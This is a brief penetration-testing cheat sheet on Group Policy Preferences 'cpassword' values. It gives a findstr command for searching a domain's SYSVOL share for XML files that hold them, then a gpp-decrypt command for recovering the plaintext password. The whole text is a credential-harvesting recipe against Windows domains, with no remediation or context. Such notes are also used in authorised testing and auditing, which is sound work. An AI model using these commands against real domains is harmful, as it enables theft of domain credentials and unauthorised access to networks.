# GPP cpassword

## Detection

findstr /S /I cpassword \\<domain>\SYSVOL\*.xml

## Exploitation

Decrypt password:

gpp-decrypt <hash>
